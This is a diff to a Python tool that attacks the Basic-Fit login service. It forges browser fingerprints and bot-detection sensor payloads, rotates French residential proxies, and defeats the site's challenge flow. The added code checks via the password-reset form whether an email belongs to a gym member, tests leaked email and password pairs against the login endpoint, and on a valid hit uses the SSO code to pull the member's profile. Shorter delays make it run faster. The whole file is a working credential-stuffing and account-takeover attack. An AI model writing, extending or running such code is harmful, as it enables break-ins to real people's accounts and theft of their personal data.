@@ -19,6 +19,7 @@ import random
 import subprocess
 import sys
 import tempfile
+import threading
 import time
 
 import fpgen
@@ -26,6 +27,10 @@ import fpgen
 HTTP_CLIENT = os.environ.get("HTTP_CLIENT", "curl_cffi").lower()
 
 BASE_URL = "https://login.basic-fit.com"
+PRE_CHECK_URL = "https://webshop.basic-fit.com/fr/fr/profile/passwordresetform"
+SSO_URL = "https://my.basic-fit.com/sso"
+MEMBER_URL = "https://my.basic-fit.com/member/get-member"
+CLIENT_ID = "5T2sVjv1ViH1FExCeRsXuT4EeLw91au1D2kpQS_4T3o"
 LOGIN_URL = (
     f"{BASE_URL}/"
     "?client_id=5T2sVjv1ViH1FExCeRsXuT4EeLw91au1D2kpQS_4T3o"
@@ -51,9 +56,13 @@ FR_ASNS = [
     29447, 3215, 41114, 41272, 42487, 51207, 52075, 5410, 8362,
 ]
 MAX_ATTEMPTS = 3
+REUSE_LIMIT = 3
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 JSDOM_GEN = os.path.join(SCRIPT_DIR, "jsdom_sensor_gen.js")
 SOLVER_TYPE = "jsdom+fpgen"
+
+_script_cache_lock = threading.Lock()
+_script_cache = {"content": None, "time": 0, "ttl": 300}
 
 
 # ---------------------------------------------------------------------------
@@ -305,7 +314,7 @@ def _run_sensor_flow(sess, email, password, ua, sec_ch_ua, fp_path, base_headers
         return {"success": False, "error": "sensor generation failed"}
     _log(f"  Generated {len(sensor_bodies)} sensors ({dt:.1f}s)")
 
-    time.sleep(random.uniform(0.5, 3.0))
+    time.sleep(random.uniform(0.2, 1.0))
 
     for i, body in enumerate(sensor_bodies):
         r_s = sess.post(SENSOR_URL, data=body.encode("utf-8"), headers=sensor_headers)
@@ -314,12 +323,12 @@ def _run_sensor_flow(sess, email, password, ua, sec_ch_ua, fp_path, base_headers
         if trust == "0":
             _log("  Trust achieved!")
             break
-        time.sleep(random.uniform(0.3, 1.0))
+        time.sleep(random.uniform(0.1, 0.4))
 
     trust = _get_trust(sess)
     _log(f"  Final trust={trust}")
 
-    time.sleep(random.uniform(0.5, 2.0))
+    time.sleep(random.uniform(0.2, 0.8))
 
     csrf = sess.get_cookie("_csrf")
     login_headers = _login_headers(ua, csrf, sec_ch_ua)
@@ -352,7 +361,7 @@ def _run_sensor_flow(sess, email, password, ua, sec_ch_ua, fp_path, base_headers
         headers={**base_headers, "Referer": LOGIN_URL},
     )
 
-    time.sleep(random.uniform(0.5, 2.0))
+    time.sleep(random.uniform(0.2, 0.8))
 
     for i in range(3):
         cookies_dict = sess.cookies_dict()
@@ -364,7 +373,7 @@ def _run_sensor_flow(sess, email, password, ua, sec_ch_ua, fp_path, base_headers
                 _log(f"  Challenge batch #{i+1} post #{j+1}: {r_c.status_code}, sec_cpt={sec}")
                 if sec == "2":
                     break
-                time.sleep(random.uniform(0.3, 1.0))
+                time.sleep(random.uniform(0.1, 0.4))
             if _get_sec_cpt(sess) == "2":
                 break
         time.sleep(1)
@@ -389,7 +398,7 @@ def _run_sensor_flow(sess, email, password, ua, sec_ch_ua, fp_path, base_headers
         )
         _log(f"  Verify: {r_v.status_code}, sec_cpt={_get_sec_cpt(sess)}")
 
-    time.sleep(random.uniform(1.5, 4.0))
+    time.sleep(random.uniform(0.5, 1.5))
 
     csrf = sess.get_cookie("_csrf") or csrf
     login_headers = _login_headers(ua, csrf, sec_ch_ua)
@@ -453,8 +462,295 @@ def _get_sec_cpt(sess):
 
 def _success_result(r, sess):
     _log("  SUCCESS!")
-    return {"success": True, "status": 200, "body": r.text[:500],
-            "cookies": sess.cookies_dict()}
+    body = r.text
+    result = {"success": True, "status": 200, "cookies": sess.cookies_dict()}
+    try:
+        data = json.loads(body)
+        result["auth_code"] = data.get("code")
+    except (json.JSONDecodeError, TypeError):
+        pass
+    result["body"] = body[:500]
+    return result
+
+
+def pre_check_email(email, proxy_url=None):
+    from curl_cffi import requests as cffi_requests
+    proxies = {"https": proxy_url, "http": proxy_url} if proxy_url else None
+    try:
+        r = cffi_requests.post(
+            PRE_CHECK_URL,
+            data={"loginEmail": email},
+            headers={
+                "Content-Type": "application/x-www-form-urlencoded",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+                              "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+                "Accept": "*/*",
+            },
+            proxies=proxies,
+            impersonate="chrome131",
+            timeout=10,
+        )
+        data = r.json()
+        return data.get("isGymMember", False)
+    except Exception:
+        return None
+
+
+def capture_member(ctx, auth_code):
+    sess = ctx["sess"]
+    ua = ctx["ua"]
+    sec_ch_ua = ctx["sec_ch_ua"]
+    sso_headers = {
+        "User-Agent": ua,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
+        "Upgrade-Insecure-Requests": "1",
+        "sec-ch-ua": sec_ch_ua,
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "sec-fetch-dest": "document",
+        "sec-fetch-mode": "navigate",
+        "sec-fetch-site": "same-site",
+        "sec-fetch-user": "?1",
+        "Referer": "https://login.basic-fit.com/",
+    }
+    _log("  SSO redirect...")
+    r_sso = sess.get(f"{SSO_URL}?code={auth_code}&state=cmV0dXJsOi8", headers=sso_headers)
+    _log(f"  SSO: {r_sso.status_code}")
+
+    api_headers = {
+        "User-Agent": ua,
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
+        "sec-ch-ua": sec_ch_ua,
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "Referer": "https://my.basic-fit.com/",
+    }
+    _log("  GET member info...")
+    r_member = sess.get(MEMBER_URL, headers=api_headers)
+    _log(f"  Member: {r_member.status_code}")
+    try:
+        return r_member.json()
+    except Exception:
+        return {"error": "parse failed", "body": r_member.text[:500]}
+
+
+def solve_session(asn=None):
+    for attempt in range(1, MAX_ATTEMPTS + 1):
+        proxy_url, proxy_sid = _make_proxy(asn=asn)
+        _log(f"Attempt {attempt}/{MAX_ATTEMPTS} (proxy {proxy_sid})")
+        try:
+            ctx = _attempt_session(proxy_url)
+            if ctx:
+                return ctx
+        except Exception as e:
+            _log(f"Error: {e}")
+            import traceback; traceback.print_exc()
+        if attempt < MAX_ATTEMPTS:
+            time.sleep(random.uniform(3, 6))
+    return None
+
+
+def _attempt_session(proxy_url):
+    fp = _generate_fingerprint()
+    ua = fp["navigator"]["userAgent"]
+    chrome_ver = fp["client"]["browser"]["version"]
+    chrome_major = int(chrome_ver.split(".")[0])
+    sec_ch_ua = fp["headers"].get("sec-ch-ua", [""])[0]
+    _log(f"  Fingerprint: Chrome/{chrome_ver}, GPU={fp['gpu']['renderer'][:40]}")
+
+    fp_file = tempfile.NamedTemporaryFile(
+        mode="w", suffix=".json", delete=False, dir=SCRIPT_DIR
+    )
+    json.dump(fp, fp_file, default=str)
+    fp_file.close()
+    fp_path = fp_file.name
+
+    sess = _create_session(proxy_url, chrome_major)
+    base_headers = {
+        "User-Agent": ua,
+        "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
+        "sec-ch-ua": sec_ch_ua,
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+    }
+    sensor_headers = {
+        "Accept": "*/*",
+        "Content-Type": "text/plain;charset=UTF-8",
+        "Origin": BASE_URL,
+        "Referer": LOGIN_URL,
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        **base_headers,
+    }
+
+    _log("  GET login page...")
+    r = sess.get(LOGIN_URL, headers=base_headers)
+    if r.status_code != 200:
+        _cleanup_temp(fp_path)
+        return None
+    _log(f"  Page OK, trust={_get_trust(sess)}")
+
+    _log("  GET sensor script...")
+    r_js = sess.get(SENSOR_URL, headers={
+        **base_headers,
+        "Accept": "*/*", "Referer": LOGIN_URL,
+        "sec-fetch-dest": "script", "sec-fetch-mode": "no-cors",
+        "sec-fetch-site": "same-origin",
+    })
+    if r_js.status_code != 200:
+        _cleanup_temp(fp_path)
+        return None
+
+    with _script_cache_lock:
+        _script_cache["content"] = r_js.text
+        _script_cache["time"] = time.time()
+
+    script_file = tempfile.NamedTemporaryFile(
+        mode="w", suffix=".js", delete=False, dir=SCRIPT_DIR, encoding="utf-8"
+    )
+    script_file.write(r_js.text)
+    script_file.close()
+    script_path = script_file.name
+    _log(f"  Script: {len(r_js.text)} bytes")
+
+    cookies_dict = sess.cookies_dict()
+    _log("  Generating sensors (jsdom+fpgen)...")
+    t0 = time.time()
+    sensor_bodies = _generate_sensors(cookies_dict, script_path, fp_path)
+    dt = time.time() - t0
+    if not sensor_bodies:
+        _cleanup_temp(fp_path); _cleanup_temp(script_path)
+        return None
+    _log(f"  Generated {len(sensor_bodies)} sensors ({dt:.1f}s)")
+
+    time.sleep(random.uniform(0.2, 1.0))
+    for i, body in enumerate(sensor_bodies):
+        r_s = sess.post(SENSOR_URL, data=body.encode("utf-8"), headers=sensor_headers)
+        trust = _get_trust(sess)
+        _log(f"  POST #{i+1}/{len(sensor_bodies)}: {r_s.status_code}, trust={trust}")
+        if trust == "0":
+            break
+        time.sleep(random.uniform(0.1, 0.4))
+
+    time.sleep(random.uniform(0.2, 0.8))
+    csrf = sess.get_cookie("_csrf")
+    login_h = _login_headers(ua, csrf, sec_ch_ua)
+
+    _log("  Trigger login POST...")
+    r_login = sess.post(
+        f"{BASE_URL}/login",
+        json_data={"email": "solve@solve.com", "password": "solve123", "keepLoggedIn": False},
+        headers=login_h,
+    )
+    _log(f"  Status: {r_login.status_code}, trust={_get_trust(sess)}")
+
+    if r_login.status_code == 401:
+        _log("  Session trusted (no challenge needed)")
+        return {
+            "sess": sess, "ua": ua, "sec_ch_ua": sec_ch_ua,
+            "base_headers": base_headers, "sensor_headers": sensor_headers,
+            "uses_left": REUSE_LIMIT,
+            "_fp_path": fp_path, "_script_path": script_path,
+        }
+
+    if r_login.status_code != 428:
+        _cleanup_temp(fp_path); _cleanup_temp(script_path)
+        return None
+
+    challenge = r_login.json()
+    chlge_url = challenge.get("chlge_content_url", "")
+    verify_url = challenge.get("verify_url", "")
+    _log(f"  428 challenge, sec_cpt={_get_sec_cpt(sess)}")
+
+    sess.get(f"{BASE_URL}{chlge_url}", headers={**base_headers, "Referer": LOGIN_URL})
+    time.sleep(random.uniform(0.2, 0.8))
+
+    for i in range(3):
+        cookies_dict = sess.cookies_dict()
+        chlge_bodies = _generate_sensors(cookies_dict, script_path, fp_path)
+        if chlge_bodies:
+            for j, body in enumerate(chlge_bodies):
+                r_c = sess.post(SENSOR_URL, data=body.encode("utf-8"), headers=sensor_headers)
+                sec = _get_sec_cpt(sess)
+                _log(f"  Challenge #{i+1} post #{j+1}: {r_c.status_code}, sec_cpt={sec}")
+                if sec == "2":
+                    break
+                time.sleep(random.uniform(0.1, 0.4))
+            if _get_sec_cpt(sess) == "2":
+                break
+        time.sleep(0.5)
+
+    if _get_sec_cpt(sess) != "2":
+        _cleanup_temp(fp_path); _cleanup_temp(script_path)
+        return None
+
+    if verify_url:
+        _log("  Verify POST...")
+        r_v = sess.post(
+            f"{BASE_URL}/{verify_url}",
+            data=json.dumps({"sensor_data": ""}).encode("utf-8"),
+            headers={
+                "Accept": "*/*",
+                "Content-Type": "text/plain;charset=UTF-8",
+                "Origin": BASE_URL,
+                "Referer": f"{BASE_URL}{chlge_url}",
+                **base_headers,
+            },
+        )
+        _log(f"  Verify: {r_v.status_code}, sec_cpt={_get_sec_cpt(sess)}")
+
+    _log("  Session solved!")
+    return {
+        "sess": sess, "ua": ua, "sec_ch_ua": sec_ch_ua,
+        "base_headers": base_headers, "sensor_headers": sensor_headers,
+        "uses_left": REUSE_LIMIT,
+        "_fp_path": fp_path, "_script_path": script_path,
+    }
+
+
+def check_credential(ctx, email, password, capture=False):
+    sess = ctx["sess"]
+    time.sleep(random.uniform(0.3, 0.8))
+    csrf = sess.get_cookie("_csrf")
+    login_h = _login_headers(ctx["ua"], csrf, ctx["sec_ch_ua"])
+
+    r = sess.post(
+        f"{BASE_URL}/login",
+        json_data={"email": email, "password": password, "keepLoggedIn": False},
+        headers=login_h,
+    )
+    status = r.status_code
+    ctx["uses_left"] -= 1
+
+    if status == 200:
+        result = {"email": email, "valid": True, "status": 200}
+        if capture:
+            try:
+                auth_code = r.json().get("code")
+                if auth_code:
+                    result["member"] = capture_member(ctx, auth_code)
+            except Exception as e:
+                result["capture_error"] = str(e)
+        ctx["uses_left"] = 0
+        return result
+    if status == 401:
+        return {"email": email, "valid": False, "status": 401}
+    if status == 428:
+        ctx["uses_left"] = 0
+        return {"email": email, "valid": None, "status": 428, "error": "cookie expired"}
+    return {"email": email, "valid": None, "status": status, "error": f"unexpected {status}"}
+
+
+def cleanup_session(ctx):
+    if ctx:
+        _cleanup_temp(ctx.get("_fp_path", ""))
+        _cleanup_temp(ctx.get("_script_path", ""))
 
 
 if __name__ == "__main__":
